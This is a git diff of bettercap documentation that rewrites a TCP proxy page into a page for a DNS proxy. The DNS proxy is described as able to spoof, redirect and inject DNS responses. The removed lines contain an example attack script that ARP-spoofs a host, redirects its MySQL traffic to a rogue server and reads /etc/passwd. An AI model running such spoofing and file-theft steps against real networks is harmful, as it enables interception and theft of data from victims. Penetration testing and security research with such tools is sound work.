@@ -1,39 +1,46 @@
 ---
-title: "tcp.proxy"
-date: 2019-02-25T13:18:06+01:00
+title: "dns.proxy"
+date: 2025-07-14T19:43:00+01:00
 draft: false
-weight: 3
+weight: 6
 ---
 
-A TCP transparent proxy that can be scripted using javascript modules. If used together with a [spoofer](/modules/ethernet/spoofers/), all TCP traffic to a given address and port will be redirected to it and it will automatically handle port redirections as needed.
+A full featured DNS proxy that can manipulate DNS traffic in real-time.  
+It can be used for DNS spoofing, redirection, logging, or injection of custom DNS responses.
 
-The optional `tcp.tunnel` parameter can be used to redirect the traffic from `tcp.address` to `tcp.tunnel.address`.
+It supports **UDP**, **TCP**, and **TCP-TLS** protocols, with automatic generation of a self-signed certificate if needed.
 
-### Commands
+Additionally, `dns.proxy` can be scripted using JavaScript modules, similarly to `http.proxy` and `https.proxy`, to manipulate requests and responses dynamically.
 
-#### `tcp.proxy on`
+## Commands
 
-Start the TCP proxy.
+### `dns.proxy on`
 
-#### `tcp.proxy off`
+Start the DNS proxy.
 
-Stop the TCP proxy.
+### `dns.proxy off`
 
-### Parameters
+Stop the DNS proxy.
 
-| parameter            | default               | description                                       |
-| -------------------- | --------------------- | ------------------------------------------------- |
-| `tcp.port`           | `443`                 | TCP port to redirect when the proxy is activated. |
-| `tcp.address`        |                       | **Mandatory** remote address of the TCP proxy.    |
-| `tcp.proxy.port`     | `8443`                | Port to bind the TCP proxy to.                    |
-| `tcp.proxy.address`  | `<interface address>` | Address to bind the TCP proxy to.                 |
-| `tcp.proxy.script`   |                       | Path of a proxy module script.                    |
-| `tcp.tunnel.address` |                       | Address to redirect the TCP tunnel to (optional). |
-| `tcp.tunnel.port`    |                       | Port to redirect the TCP tunnel to (optional)     |
+## Parameters
+
+| Parameter               | Default                    | Description                                                                                 |
+| ----------------------- | -------------------------- | ------------------------------------------------------------------------------------------- |
+| `dns.port`              | `53`                       | DNS port to redirect when the proxy is activated.                                           |
+| `dns.proxy.address`     | `<interface address>`      | Address to bind the DNS proxy to.                                                           |
+| `dns.proxy.blacklist`   |                            | Comma separated list of client IPs to skip while proxying (wildcard allowed).               |
+| `dns.proxy.whitelist`   |                            | Comma separated list of client IPs to proxy if the blacklist is used.                       |
+| `dns.proxy.nameserver`  | `1.1.1.1`                  | DNS resolver address.                                                                       |
+| `dns.proxy.port`        | `8053`                     | Port to bind the DNS proxy to.                                                              |
+| `dns.proxy.protocol`    | `udp`                      | Network protocol for the DNS proxy server to use. Accepted values: `udp`, `tcp`, `tcp-tls`. |
+| `dns.proxy.redirect`    | `true`                     | Enable or disable port redirection with iptables.                                           |
+| `dns.proxy.certificate` | `~/.bettercap-ca.cert.pem` | DNS proxy certification authority TLS certificate file.                                     |
+| `dns.proxy.key`         | `~/.bettercap-ca.key.pem`  | DNS proxy certification authority TLS key file.                                             |
+| `dns.proxy.script`      |                            | Path of a JS proxy script.                                                                  |
 
 ### Modules
 
-The `tcp.proxy` module can be scripted using javascript files that must declare at least one of the following functions:
+The `dns.proxy` module can be scripted using JavaScript files that must declare at least one of the following functions:
 
 ```js
 // called when the script is loaded
@@ -41,16 +48,33 @@ function onLoad() {
   // ...
 }
 
-// called when data is available
-// return an array of bytes to override "data"
-function onData(from, to, data) {
+// called when the DNS request is received by the proxy
+// and before it is sent to the real resolver.
+function onRequest(req, res) {
   // ...
+}
+
+// called when the DNS request is sent to the real resolver
+// and a response is received.
+function onResponse(req, res) {
+  // ...
+}
+
+// called every time an unknown session command is typed,
+// proxy modules can optionally handle custom commands this way:
+function onCommand(cmd) {
+  if (cmd == "test") {
+    /*
+     * Custom session command logic here.
+     */
+
+    // tell the session we handled this command
+    return true;
+  }
 }
 ```
 
-Modules can change the `data` buffer and return it, signaling the proxy to override the original buffer.
-
-### Builtin Functions
+#### Builtin Functions
 
 Modules can use the following builtin functions.
 
@@ -79,31 +103,3 @@ Modules can use the following builtin functions.
 | `onEvent("event.tag", callback)`            | Register a JS callback for the given session event tag.                       |
 | `removeEventListener("event.tag")`          | Remove a previously registered event listener for the given tag.              |
 | `addSessionEvent("tag", data)`              | Trigger a session event from within the script with a custom tag and payload. |
-
-### Examples
-
-The [rogue-mysql-server.cap](https://github.com/bettercap/caplets/blob/master/rogue-mysql-server.cap) executes an ARP spoofing attack against a single host and redirect the MySQL traffic to a [builtin rogue server](/modules/ethernet/servers/mysql.server/):
-
-```sh
-# set the target for arp spoofing
-set arp.spoof.targets 192.168.1.236
-
-# bind rogue mysql server to localhost and
-# set the file we want to read
-set mysql.server.address 127.0.0.1
-set mysql.server.port 3306
-set mysql.server.infile /etc/passwd
-mysql.server on
-
-# set the ip from the mysql server we want to impersonate
-set tcp.address 93.184.216.34
-set tcp.port 3306
-
-# set the ip from the rogue mysql server
-set tcp.tunnel.address 127.0.0.1
-set tcp.tunnel.port 3306
-
-# go ^_^
-tcp.proxy on
-arp.spoof on
-```
